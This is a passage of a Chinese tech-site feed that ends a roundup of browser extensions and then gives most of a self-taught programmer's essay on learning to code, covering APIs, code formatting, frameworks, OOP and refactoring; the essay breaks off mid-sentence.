href=\"https://chrome.google.com/webstore/detail/tab-with-a-view/mlhimllheakianplccjmedmiabppmeaj\" target=\"_blank\">Chrome 网上应用商店</a> 和 <a href=\"https://microsoftedge.microsoft.com/addons/detail/tab-with-a-view/nkoiohagjogamopakhodfiegokficcek\" target=\"_blank\">Edge 网上应用商店</a> 免费获取 Tab with A view。</p>\n<h2>Teleparty：和朋友一起在线观影</h2>\n<p>疫情催生了很多需求，和远方的朋友一起在线观影就是个不错的点子。</p>\n<p>Teleparty 的前身是 Netflix Party，2.0 版本改名 Teleparty 的同时也加入了对 Hulu、Disney+ 和 HBO 的支持。使用方法也非常简单：安装扩展后打开 Netflix、Amazon Prime Video、Disney+、Hulu 或 HBO 任意一家的在线播放窗口，然后点击扩展按钮生成 Teleparty 邀请链接，朋友就能通过这个链接加入你的「虚拟房间」一起看剧了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/13/f0f9c2b3d9215ac64c01382d2db098e1.png\"><figcaption>Netflix 共同观影效果，影片内容受版权保护无法截取</figcaption></figure><p>除了在开启时选择是否允许受邀者控制播放外，我们还可以顺带开启侧栏聊天室；设置好头像和昵称，大家就能边看边吐槽了。</p>\n<p>你可以在 <a href=\"https://chrome.google.com/webstore/detail/netflix-party-is-now-tele/oocalimimngaihdkbihfgmpkcpnmlaoa\" target=\"_blank\">Chrome 网上应用商店</a> 和 <a href=\"https://microsoftedge.microsoft.com/addons/detail/netflix-party-is-now-tele/igbncjcgfkfnfgbaieiimpfkobabmkce\" target=\"_blank\">Edge 网上应用商店</a> 免费获取 Teleparty。</p>\n<h2>Lepton：新版 Firefox 最佳伴侣</h2>\n<p>Firefox 一直都有一套自己的设计语言，在 88 版本前叫 <a href=\"https://design.firefox.com/photon/\" target=\"_blank\">Photon</a>，而升级到 89 版本后则由 <a href=\"https://wiki.mozilla.org/Firefox/Proton\" target=\"_blank\">Proton</a> 取而代之。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/66984\" target=\"_blank\">4 年来最大更新，焕然一新的 Firefox 89 稳定版都有哪些新变化？</a></p>\n<p>新设计更加符合现代浏览器审美，但仍有不少地方不那么让 Firefox 用户满意，如菜单选项图标不全、标签页和按钮样式混淆、部分界面边距太宽等等。</p>\n<p>因此开发者 @<a href=\"https://github.com/black7375\" target=\"_blank\">black7375</a> 自动动手做了一套针对 Firefox 新界面的修复补丁，对大部分新界面存在的 UI 设计问题进行了微调，参考效果如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/13/article/8f02998fdac4c276ac5c444d801d3f00\"><figcaption>对比图 1</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/13/article/73e422b3a22529a3d97c07d4bf41461b\"><figcaption>对比图 2</figcaption></figure><p>你可以在 <a href=\"https://github.com/black7375/Firefox-UI-Fix\" target=\"_blank\">GitHub</a> 获取 Lepton，安装前请仔细阅读安装说明。</p>\n<h2>Better Writer：AI 辅助写作</h2>\n<p>上一期介绍的<a href=\"https://chrome.google.com/webstore/detail/tldr-this-free-automatic/jjmnbidkmmabkalampbilajnheeokpoj\" target=\"_blank\"> TLDR This </a>和 <a href=\"https://chrome.google.com/webstore/detail/web-highlight/nacjdocenajmlomcagpkmhpikhcdligg\" target=\"_blank\">Web Highlight</a> 都是通过 AI 识别网络中文字内容的好手，前者可以快速总结、生成文章概要，后者可以通过 AI 识别给网页内容划取重点。今天介绍的 Better Writer 则进一步借由 GPT-3 语言模型来给文字添加「魔法」。</p>\n<p>GPT-3 是由 OpenAI 公司基于谷歌开发的变换语言模型训练和开发，其神经网络包含 1750 亿个神经，为全世界参数最多的神经网络模型，微软公司也在 2020 年 9 月 22 日宣布取得了 GPT-3 的独家授权，其实力不言而喻。</p>\n<p>具体到 Better Writer，输入一句 「I like cats.」，通过「Elaborate Text」AI 工具加持后，会生成例如「I like cats because they are playful, independent, and they don't like getting in fights. Cats can also be funny and cute.」等多个结果备选。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/13/article/99a80c9c44544111854e562e83f3aecd\"></figure><p>目前 Better Writer 官网已经内置了 17 种写作工具，同时还提供写作类的方法论指导，如果对英文写作有一定需求，不妨在 <a href=\"https://betterwriter.ai/\" target=\"_blank\">官网</a> 体验一下。</p>\n<p>你可以在 <a href=\"https://chrome.google.com/webstore/detail/betterwriterai/fjkbkpcdannglhledpgjefalcfkbibng/related\" target=\"_blank\">Chrome 网上应用商店</a> 免费获取 Better Writer。</p>\n<h2>Super Agent：一键设置 Cookies</h2>\n<p>浏览一个全新的网页时，常常因为网站的追踪需求需要点击弹出的 Cookies 请求框，长久以往大家应该也都有些厌烦了，毕竟大多数网站提供的 Cookies 条例都难以阅读，很多时候我们只是一味点击允许或不允许来屏蔽视觉干扰。</p>\n<p>通过 Super Agent 这款扩展，我们则可以为每个支持的网站设置一次首选项，后续该扩展将自动根据我们的偏好设置自动选择 Cookies 设定，帮你点一下的节省时间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/13/article/b9d58b3455d9cc6ffa85fd26d78ef8c7\"></figure><p>你可以在 <a href=\"https://chrome.google.com/webstore/detail/super-agent-automatic-coo/neooppigbkahgfdhbpbhcccgpimeaafi\" target=\"_blank\">Chrome 网上应用商店</a>、<a href=\"https://microsoftedge.microsoft.com/addons/detail/super-agent-automatic-c/mkdkilgodopmghhmfegikhieplbipfei\" target=\"_blank\">Edge 网上应用商店</a> 和 <a href=\"https://addons.mozilla.org/en-US/firefox/addon/super-agent/\" target=\"_blank\">Firefox 扩展商店</a> 中免费获取 Super Agent。</p>\n<h2>Trove：标注 &amp; 发送内容到 Notion</h2>\n<p>尽管 Notion 提供了官方的剪藏工具，方便将网页内容一键迁移到用户的数据库中，但用户在浏览网页中的剪藏需求远远不止于此。</p>\n<p>比如很多时候我想将公众号文章或微信读书中的精彩段落摘抄到 Notion 中，一般来讲需要手动复制、打开 Notion 粘贴、然后进行高亮语段等等操作，一番折腾下来并不容易。</p>\n<p>Trove 抓住了这个需求并将其开发成了网页扩展程序：你可以通过手动给内容划线，然后通过 <code>CMD+D</code> 将文字内容以高亮形式发送到 Notion 中或将网页以书签的方式直接剪藏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/13/article/6de5cf467b7a68a9096f30a2ffb44085\"></figure><p>你可以在 <a href=\"https://chrome.google.com/webstore/detail/trove/lmmkdhhionkgeflajjokpmeogekfdoel\" target=\"_blank\">Chrome 网上应用商店</a> 免费获取 Trove，搭配官方的剪藏工具，发挥出 Notion 的全部威力。</p>\n<h2>Trimbox for Gmail：Gmail 订阅清理</h2>\n<p>浏览网站看到感兴趣的内容总是希望订阅下来以便定期或日后查看，但结果却往往是收件箱堆满了稍后不读的各种订阅。对邮件没有整理强迫症的情况下当然问题不大，一旦某天需要找到一封几个月或几年前的邮件时，铺天盖地的订阅邮件才会令我们「悔不当初」。</p>\n<p>遇到以上情况并且 Gmail 的退订功能无法准确识别时，不妨试试 Trimbox for Gmail 这款工具，仅仅一次点击，就可以为你一次性清退掉不再需要的订阅，无需再点开邮件、查找退订设置并跳转网页。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/13/article/bccf882f649936b813f5965dadbceda1\"></figure><p>你可以在 <a href=\"https://chrome.google.com/webstore/detail/trimbox-for-gmail-unsubsc/jdlcknnokoelkdobgacandnnnmoblhgh/related\" target=\"_blank\">Chrome 网上应用商店</a> 免费获取 Trimbox for Gmail。</p>\n<h2>Fix Contrast：对比度自动校正</h2>\n<p>依据 <a href=\"https://webaim.org/projects/million/#contrast\" target=\"_blank\">WebAIM Million report</a> 的统计，全球 86.4% 的网页文本对比度都处于低水平，而低对比度的文本内容由于视差过小，往往阅读困难，长时间浏览这样的内容眼睛更容易疲劳。</p>\n<p>Fix Contrast 支持网页对比度的自动校正，对于低对比度的网站，也可以一键设置 Medium 或 High 级别的文字对比度，让网页内容更易阅读和分辨。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/13/article/8e905ecceddc269d1be9c6e788fc65ba\"><figcaption>少数派会员网站的高对比度效果</figcaption></figure><p>你可以在 <a href=\"https://fixa11y.com/\" target=\"_blank\">Fix Contrast 官网</a>、<a href=\"https://chrome.google.com/webstore/detail/fix-contrast/pbbcgecjmpkglppfjjggkkbhdnlemhkg\" target=\"_blank\">Chrome 网上应用商店</a>、<a href=\"https://microsoftedge.microsoft.com/addons/detail/fix-contrast/cglmfaokelifdefnifhfdpmcckjfedeb\" target=\"_blank\">Edge 网上应用商店</a> 免费获取 Fix Contrast。</p>\n<hr>\n<p>以上就是本期介绍的所有 9 款浏览器扩展插件，如果你也有好的扩展插件，欢迎在评论留言分享，我们下期再见~</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67687"},{"title":"从入门到程序员初长成：这是我的 Roadmap","date":"2021-07-13 06:48:13","description":"\n<p>2020 年注定是充满着悲情与不平凡的一年，如果世界上有像游戏那样的「重新游戏」功能，那我相信绝大多数人都会想重启 2020 年。</p>\n<p>年底将至，我回望从去年毕业到现在个人的成长，从一个最初代码都敲不利索且毛发旺盛的大学生，到现在毛发依旧旺盛只是代码敲得更利索的 Coder 一年的时间里，我没想到自己能够有这么快的成长速度。如果能重来，那么我应该会比现在有着更明确的成长方向，也会少走不少弯路。</p>\n<p>在工作中我的定位是什么呢？大数据分析师、后端工程师、运维工程师、数据挖掘工程师等⋯⋯通常来说，只要是体量较大的公司，往往分工会十分明确，每个人都只要「拧好自己的螺丝」即可；但在新开辟的部门或者小公司里，可能就会像我一样有着多种角色或身份，职能并不明确且模糊。</p>\n<p>但我的这些角色身份都有一个共同之处，那就是跟<strong>代码</strong>息息相关。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/d1a9fe6e3385829ed567f28f183ec5ce.png\"></figure><p>所以为了行文方便，我也会以「程序员」这既通用又充满刻板印象的角色为视角说一说我是如何成为一个合格的初级程序员。</p>\n<h2>Hello, World</h2>\n<p>提起「程序员」一词，你会想到什么？</p>\n<p>格子衫？随身带着傻大黑电脑的理工男？不善言辞但又思维敏捷？直男般的说话方式？</p>\n<p>可能我对于程序员这一职业存在的刻板印象描述并不完全，但这些话术确实是和程序员人群的职业特征在某些方面存在着重合或者相似性。</p>\n<p>我在毕业之前，从来也不曾想过有天我会成为一名程序员。那时的我虽然只是对敲代码感兴趣，但做的通常都是处理数据或做和数据分析有关的事情。程序员一词在当时的我看来就是像黑客那样有着高超技术的一类人或职业，并且想要成为程序员的基础就是必须得是计算机类专业这样科班出身才行。</p>\n<p>而我只是一名社科专业的文科生，这种看着和计算机类专业相比就是南辕北辙的学科背景似乎让我从一开始好像就和程序员的这一词沾不上边。</p>\n<p>但事实上，<strong>你的学科背景并不会限制你成为一名程序员</strong>。（当然如果你有计算机基础或是科班出身那将会是更好的）</p>\n<p>举个最著名的例子就是，JavaScript 领域里 <a href=\"https://cn.vuejs.org/\" target=\"_blank\">Vue</a> 这一知名框架的作者尤雨溪（知乎：<a href=\"https://www.zhihu.com/people/evanyou\" target=\"_blank\">尤雨溪</a>）本人就不是计算机专业出身的，根据 freeCodeCamp 的这篇 <a href=\"https://www.freecodecamp.org/news/between-the-wires-an-interview-with-vue-js-creator-evan-you-e383cbf57cc4/\">访谈</a> 可以得知，尤大本科读的艺术史，研究生阶段读的设计与技术（the Master of Fine Arts for Design and Technology）。但他创造的这一框架却在国内外都被众多公司使用（包括少数派）。</p>\n<p>所以至今你也会看到很多非计算机专业的<strong>非科班</strong>程序员的身影，在成为程序员之前他们的学科背景可能都是来自于生物信息、通信或是像我一样的社会科学等。</p>\n<p>但也并不意味着所有人都能成为一名程序员，抛开代码、编程语言来说，想成为程序员应该具备最基础的东西是：</p>\n<ol>\n<li>\n<strong>逻辑</strong>。无论是你写的代码，还是跟产品经理或者客户解释，都离不开逻辑。这种逻辑并不是指逻辑学这门课程里的逻辑，而是指<strong>把一件事情或东西讲清楚、从头到尾理顺的能力</strong>，这不仅体现在你的口头表达中，还体现在你的代码中。</li>\n<li>\n<strong>找/解决问题的能力</strong>。代码是人写的，但只要是人写的必然会存在 Bug 或是问题。一个优秀的程序员或者工程师不在于它会用什么框架、会哪些技巧，而是能够在问题发生时快速定位到问题、甚至解决问题。所以不要以为国内的搜索引擎能帮到你所有，你需要的是「另外一个世界」；同时还能从源码或者别人的给出的代码中，找出或者创造出自己的解决方案。</li>\n<li>\n<strong>手动实践的能力</strong>。我曾跟同事聊天时就说了我一个文科生对于程序员这门职业的一个直观感受：<strong>手艺人</strong>。和木匠、厨师、演员等这类职业一样，程序员也都需要不断地练习、实践。从来没有谁能够说自己一行代码不写就可以构造出一个完美的程序。无论是在工作还是学习时，程序员都要能够多动手实践、代码敲一敲看看是否能够真正运行一个样例程序，并对这个程序进行二次或多次加工、改造。</li>\n</ol>\n<p>非科班的程序员相比于科班程序员来说的优势在于多了<strong>跨领域、跨专业</strong>的知识经验，但劣势就在于计算机基础、编程和技术等方面的不足。</p>\n<p>所以一旦成为了非科班的程序员，就意味着我们是属于「先上车后补票」的那批人，那么我们能做的就只有：<strong>恶补，疯狂地补课计算机相关的东西</strong>。这也预示我们会完全进入到了一个由数字和代码所构成的领域。</p>\n<p>欢迎来到程序世界：Hello, World!</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/acdf7c6409b59fb1539a67b4f933658e.png\"></figure><h2>熟能生巧：先做 API 工程师和调包侠</h2>\n<p>写代码这件事和烹饪其实很类似，在这件事上我这个经常做饭的厨子深有感触。</p>\n<p>我想起在我刚学着做饭时，无论是使用菜刀切菜还是起火掌勺无一不是蹑手蹑脚，而随着做饭的次数的增多，我也由最初蹑手蹑脚的模样转变成为一个熟练、信手拈来的「干饭人」。不管是刀具、锅铲还是调味料，都能被我游刃有余地使用。</p>\n<p>因此一个合格的厨师如果连刀具、锅铲和调味料都用不好，那这个人还能算是个合格的厨师吗？所以答案是显而易见的。</p>\n<p>所以，在学习编程的过程中，根据基础的教程或课程入门之后并不代表着我们就是一个初级且合格的程序员了。我们首先就应该成为一个 API 工程师和调包侠。</p>\n<p>所谓的 API（Application Programming Interface）就是你所使用的编程语言里都内置了哪些基本的函数、方法；而调包（或库，Library）即调用别人写好的包或库来编程之意。如果你有经常看各种初级的编程书籍或者教程就会发现，当中的大部分内容不是在讲原理和实现，而是在讲如何用这些基本的 API 或者常用库！</p>\n<p>因为无论是初级、中级还是高级的工程师或程序员，对于各种基本的 API 和常用的内置库或第三方库的使用都是信手拈来，这些东西就好比是刀具、锅铲和调味料，它是我们构建一个程序的起点。能将这些基本的 API 和库用熟练或操作了，那就说明用来创造的工具已经玩熟了，剩下的就需要我们在实际项目中像乐高积木一样发挥想象力来将它们组合在一块。</p>\n<p>在知乎上有看到别人回答如何入门或者学习一门编程语言之类的问题时，一上来就抛出各种计算机基础、编译原理、内存管理（除 C 或 C++ 之外）时，相信没有多少人能够真正实践下去（这些是内功，但不适用先上车后补票的非科班人群）。这就好比说你做菜时别人先跟你讲各种菜系的演进、配方的配比一样让人心神乏味。</p>\n<p>因此无论是学习一门编程语言也好，还是想成为一个合格的工程师、程序员也好，都不要忽视对基本 API 和常用的内置库或第三方库熟悉或使用。因为<strong>这部分没有什么难度，这就和高考里面的「送分题」一样</strong>，无论是学霸还是学渣都通过死记硬背的方式拿到分数，如果别人都做到了自己却没做到，那么自己就应该好好反思一下了。</p>\n<p>对于这些东西我们不需要死记硬背。一方面，大部分东西会因为我们经常使用而形成肌肉记忆（换而言之就算记住了一旦用得少了也就忘掉了）；另一方面，我们可以通过像 <a href=\"https://kapeli.com/dash\" target=\"_blank\">Dash</a> （只有 macOS 版本，Windows 可以用 <a href=\"https://zealdocs.org/\" target=\"_blank\">Zeal</a>）这样的文档查阅 APP 或是直接到官方文档中去查阅相关用法即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_nicholaszhang/16233797344235.png\" alt=\"Dash\"><figcaption>Dash</figcaption></figure><h2>代码审美：该开始学会「捯饬」自己的代码了！</h2>\n<p>「捯饬」（dáo chi）一词属于北方地区的用词，大意就是修饰、梳理、整理之意。</p>\n<p>当学完基本的 API 时，就应该说明你已经是个会用工具做事的家伙了，但不意味着你的代码是好的代码。合格的程序员，甚至是高级的程序员或工程师都更容易写出好的代码。</p>\n<p>说到好的代码我们可能脑海里已经浮现出那么几个描述：</p>\n<ol>\n<li>能够稳定运行</li>\n<li>高级、简洁的处理技巧</li>\n<li>强大且有着丰富的功能</li>\n<li>⋯⋯</li>\n</ol>\n<p>这些描述确实是属于好的代码的范畴，但这却不是初级程序员首当其冲要考虑的。首当其冲的是什么？</p>\n<p><strong>格式化你的代码，遵循编程规范</strong>。</p>\n<p>人是感官动物，视觉是我们能够快速获取信息的第一途径。因此伴随着这样的生理特性人也在千百年进化中衍生出了对「审美」的要求。</p>\n<p>在对程序员的众多刻板印象中，「缺乏审美」可能也是其中板上钉钉的一条。</p>\n<p>虽然这指的是程序员的穿着打扮或是设计的东西，但我需要为程序员正名的是，程序员也是有审美的。除了将自己使用的 IDE（集成开发环境 Integrated Development Environment）用不同主题装扮得赏心悦目之外，还能体现审美的地方在于<strong>代码</strong>本身。</p>\n<p>对一个程序员来说，衡量一段代码是否是好代码，映入眼帘的第一眼就是看这段代码是否规范、工整。这也和我们每个人作为消费者和用户来说是一致的，如果有一件衣服奇丑无比，但它却是用料上乘，作为消费者来说我们单从外观上来说是无法将其和「好」字挂钩的，更不会有买它的欲望。</p>\n<p>就好比下面这两段代码（代码源于 black 格式化工具官方文档）：</p>\n<pre class=\"language-python\"><code># Bad\n\ndef very_important_function(template: str, *variables, file: os.PathLike, engine: str, header: bool = True, debug: bool = False):\n    \"\"\"Applies `variables` to the `template` and writes to `file`.\"\"\"\n    with open(file, 'w') as f:\n        ...\n\n# Good\n\ndef very_important_function(\n    template: str,\n    *variables,\n    file: os.PathLike,\n    engine: str,\n    header: bool = True,\n    debug: bool = False,\n):\n    \"\"\"Applies `variables` to the `template` and writes to `file`.\"\"\"\n    with open(file, \"w\") as f:\n        ...\n</code></pre>\n<p>相比于第一段代码的函数定义那种所有东西都堆叠在一起的风格来说，第二种会更受程序员喜欢，因为它有所换行、缩进，可读性强且排版整齐。</p>\n<p>所谓的格式化代码就是让你的代码以整齐规范的形式呈现，因为代码是人写的，也是<strong>需要人来阅读</strong>的。形象理解格式化代码就是我们在做试卷时的老师所强调的「卷面整洁，写字工整」，上面的代码示例从外观就能很好诠释。</p>\n<p>而遵循编程规范就是遵照某个语言的代码形式和规范来写代码，通常这个规范不同的编程语言会有不同的规范（如 Python 的 PEP8、谷歌的《Java Style Guide》等），这些规范可能是程序语言社区的官方提案，也可能是某个公司或大厂自己推行的（如阿里巴巴的《Java 开发手册》）。</p>\n<p>因为每个人的编码方式是风格迥异的，如果对编码的方式进行规范和统一，那么有可能会让程序出现问题或是一个人离职后接手的人很难读懂这个人遗留的代码，同时也可能增加多人协作的成本。所以这些规范出现的目的在于对使用该语言的程序员进行约束，希望程序员能够共同遵守。</p>\n<p>形象理解编程规范就和我们语文老师教的「标点符号」规范一样：对话内容时要用引号、一句话结尾要使用句号、提到书名、作品名等要使用书名号等。编程规范同样也是会有很多细节，包括变量的大小写命名、代码缩进、注释说明等。</p>\n<p>当然这些东西都是和鸡毛蒜皮一样的琐碎的部分，通常来说我们都不需要去死记硬背，更多时候我们可以通过别人编写或开发好的格式化工具就能将我们的代码排布成即符合编程规范又规范工整的漂亮代码（如：Go 语言的 gofmt、Python 的 autopep8、black 等）</p>\n<p>可尽管有自动化工具来帮我们做这些事，可至今在我的工作中，经常性碰到协作的同事不遵循规范的代码，甚至有的同事根本就不知道还有能够格式化代码这一回事。</p>\n<p>有着良好的编码规范或者编程风格不一定能保证你能找到多好的工作，但一定能保证的是这会给人留有很好的第一印象，也是你能够写出好代码的第一步！甚至在一些招聘信息当中我们可能还会看到这么一条「有着良好的编码规范或编程风格」的要求描述，如果你养成了这些良好的编程习惯，没准可能会是加分项（至少在试用期我考核别人的时候会是这样）。</p>\n<h2>模仿游戏：框架、Demo 与模仿</h2>\n<p>学习基本的 API 和调包调库这些的基础已经达到能找工作地步的 30% 了，剩下的 70% 中：</p>\n<ul>\n<li>40% 是需要能够掌握并熟练运用各种框架</li>\n<li>20% 是涉及到其它技能，如能够操作 Linux 系统、有 Java 基础或前端基础等</li>\n<li>5% 是涉及到你个人的项目经验（如果是刚毕业那就看校园经历）</li>\n<li>5% 是关于你个人在面试过程中所表现的一些语言表达能力、反应能力、智力测试表现等</li>\n</ul>\n<p>以上的划分不一定准确，具体还要看不同招聘岗位的具体要求。但有一个是能确定的就是，招程序员或者工程师就是招一个能来<strong>干活</strong>的人。说白了就是你的一些基础知识过关并能将框架玩熟练了，那你就是一个合适干活的打工人任选了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/3669175d81525675aed0a853fa657e47.png\"></figure><p>所谓的框架（framework）其实也就是别的优秀的程序员设计或编写的 <strong>API 和库的集合</strong>。这形象的理解就是等价于我们写一篇文章的「开头-内容-结尾」的三段式结构，当中每个部分都有很多可供你使用、玩耍或支撑起整篇文章的东西，或者你也可以更进一步理解为「好词好句的文章模板」。</p>\n<p>每个框架的诞生都是为了解放一些存在于程序员项目中的<strong>重复性代码</strong>或痛点，也正是因为有了框架的存在才能让干活的程序员快速投入到实际需求的开发中，而不是将工时都耗在底层实现或封装中。有效做到敏捷开发、响应式开发。</p>\n<p>框架为你预先配置了一部分东西，也留有让你能够自由发挥的部分。在整个框架的架子下发挥你作为程序员应有的想象力和对实际需求的理解，最后呈现一个具有使用价值的产品（<s>乐高玩具</s>）。</p>\n<p>比如那些用 Python 来进行一些 Web 开发的程序员，必然是会经过对 Django、Flask、Tornado 这类知名的框架学习，否则即便你只懂基本的 API 调用和调包调库，投入到真正的实际开发中也很难如鱼得水。</p>\n<p>同理，做 Java Web 开发的也必须要了解 Spring 全家桶框架、做前端开发必须要了解并能熟练使用 React、Vue 和 Angular 这三大框架当中的一个或多个才行。</p>\n<p>每个框架都会有官方对应的配套文档（即说明书，告诉你怎么用），我们能通过官方文档以及给出的示例进行初步的学习。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_nicholaszhang/16233797344563.png\" alt=\"Python 的 Django 框架入门教程\"><figcaption>Python 的 Django 框架入门教程</figcaption></figure><p>但学习的最好方式以及途径就是「学以致用」，所以除了官方文档给出的 Demo 以外，我们还需要能够自己做一个结合自己所学的 Demo，比如自己实现了一套 Web 服务的接口（CURD，即增删改查）又或是模仿框架示例做出了一个类似的网页展示等等。</p>\n<p>模仿是一种很好的学习方式，在模仿的过程中我们可能思维会受到已有文档或示例的影响固化了，但这对于一个想要成为合格或初级的程序员或工程师来说这并不重要。重要的是我们能在「依葫芦画瓢」的过程中把程序运行起来，说明我们已经能够保持和框架一致的步调了；剩下能够让我们提升的地方不在于官方文档，而是在于使用框架时出现的各种问题或 Bug，能够将它们及时定位并解决才标志着我们才是真正地掌握了框架。</p>\n<p>当我们对框架的运用到了一定程度或者会当中的实现原理有了深刻的认识时，就会发现框架不是万能的，也不是完美的；在使用的过程中框架存在的问题会逐渐暴露出来，新的痛点或者问题也会随之而来。</p>\n<p>这时有思想、有能力的工程师就会想方设法地重新打造一套框架来解决这些问题或痛点，于是乎「造轮子」的行为就产生了。这里的轮子不是指车辆上的车轮，而是可以理解为像框架、编程语言这样类似东西的一个统称。</p>\n<p>程序员们对于造轮子这件事本身也是乐此不疲。轮子造得好，那将会吸引其它志同道合的程序员们来一起共同建设，甚至久而久之在被多人使用的情况下形成自己的社区；轮子造的不好也没关系，在造轮子的这个过程中也提高自己的编程、思维、架构等能力。</p>\n<p>但无论是学习框架还是造轮子，值得肯定的是我们都是在模仿别人的游戏中成长着，我们都有着美好的未来。</p>\n<h2>晦涩难懂：元编程</h2>\n<p>对于所有「先上车后补票」的非科班程序员来说，元编程（Metaprogramming）可以说是最难的一部分。</p>\n<p>如果说学会使用内置的 API 和常用的内置库或第三方库就好比是学会武侠小说里的武功招式，那么了解并学习元编程的东西就好比是武侠小说里的内功。有了内功你不仅学习武功招式会更加得心应手，并且用起来还能威力大增。</p>\n<p>但读过武侠小说的都知道学一招一式易，但学内功难。一方面，元编程的知识纯粹就是和计算机基础或者编程语言 API <strong>底层实现原理</strong>相关的；另一方面是元编程涉及到的东西偏向于抽象且晦涩，如果是非理科专业的文科生在理解上或许会更加痛苦。</p>\n<p>在新手入门初期，不涉及元编程的原因就和我们在上高中时的扩展题一样，只需要了解但并不需要深入，因为当时的那个时期或者知识水平下就很少用得到。但如果想要提高或者向更高的层次发展，那么元编程的东西，甚至前面提到的计算机基础、编译原理、内存原理等等特别多计算机的内容都需要回过头来真正的「补课」。</p>\n<p>元编程的东西其实特别多，但有一个东西是特别重要，也是最为基础的部分，那就是<strong>面向对象编程</strong>的 OOP（Object Oriented Programming）思想。这久负盛名的且影响深远的编程范式之一，理解了这一思想去学习不同的编程语言就会发现大部分内容都是大同小异的，并且在类和对象的机制上也都是异曲同工。</p>\n<p>毫不夸张的说，有很大一批程序员对于 OOP 的思想甚至就根本没有一点认识，在编程的时候甚至都不会通过类来封装方法并创建对象，而是不断重复制造多个写法相似的函数或是共享同一个变量。</p>\n<p>在最初学习 Python 生态里的 Pandas 这一知名的第三方库时，我是经常性地碰上一个 API 就会单独学习它的用法，但却没有搞清楚它实质上是对象下的一个方法。直到我真的对 OOP 思想有着思考并实践后我才发现学习 Pandas 库真的十分容易，因为我们只需要知道我们此时正操作的是 <code>DataFrame</code>、<code>Series</code> 或是 <code>Index</code>、<code>GroupBy</code> 等对象，就调用这个对象下所具有的方法就足够了。于是就在那一刹时间里，我脑子里感受到一种豁然开朗的感觉，这种感觉就和在中学时弄懂一道数学题的解题原理一样类似。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_nicholaszhang/16233797344570.png\" alt=\"Pandas 官方 API 文档\"><figcaption>Pandas 官方 API 文档</figcaption></figure><p>所以自从那之后，无论是在学习框架或看框架配套的文档，还是阅读相关源码时，我发现最初那种抗拒的心理已经不能将我束缚，我也更容易去上手、使用一门框架及对应的方法。然而一切的一切都要归功于我真正花了有效的时间和精力对 OOP 思想进行理解。</p>\n<p>当然，理解的一个事物或者原理最好的方式就是实践，Python 的 OOP 语法并不纯粹，所以我就开始接触 Java 这一门年龄跟我一样大的编程语言，试图从中获得更好的理解。Java 比 Python 有着更为庞大的 OOP 体系，并且由于这么多年的积累，元编程相关的内容也会比 Python 更为丰富。</p>\n<p>当我学习一段时间之后再回来看 Python 里关于 OOP 的东西时会发现，似乎某些困扰自己思维的东西又被打通了，这时我才真正体会到元编程真正的魅力所在。</p>\n<h2>推倒重来：重构与模块化</h2>\n<p>正如我在本文开头所提到的：如果世界上有像游戏那样的「重新游戏」功能，那我相信绝大多数人都会想重启 2020 年。</p>\n<p>我所说的「重新游戏」的功能其实是现实世界并不存在，但在虚拟世界中是实实在在可以存在的。当我们在玩游戏保存到某一进度时，如果通关难度较高，那么存档之后我们可能有不少时候都是在「重新游戏」。</p>\n<p>代码也不是现实世界里的东西，它也能够重来，简单来说就是<strong>重新写一遍</strong>。这样的行为有一个更为标准的名词——重构（restructure）</p>\n<p>要知道，每个程序员并不是一开始就能写出很好的代码（这里的代码相比于我们上一节来说延伸到了描述那部分）。</p>\n<p>不同时间节点、不同阶段同一个人可能对相同的一段代码会有不同的写法。所以如果在很早以前我们写了一版差劲到自己都用不下去（这里已经连审美都抛弃了）的代码，那么随着对经验的积累和对新知识的学习，当我们将自己上一阶段的代码全部重新组织、编写时，重构就已经开始了。</p>\n<p>重构从哲学的角度上来说是新事物代替旧事物的过程，而不是旧事物的螺旋上升。旧代码中的思想、写法都会被重构的代码所借鉴或者使用，最终达到对早期烂代码的优化一种最优解。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/74f253bb05e8f13ec08787f9e75d207c.png\"></figure><p>在写这篇文章时，我也一直在进行着我去年接手的负责项目（基于 Flask 的算法后端接口）的重构工作。正如我前面所说的那样，去年无论是经验、编程技巧还是功能设计上都十分蹩脚的我所写的代码，现在看已经是差劲到自己都用不下去了，所以趁着整个项目的代码体量还没有过于膨胀时，并且项目技术上由我一个人把控时（是的你没看错，因为没有技术的 Leader 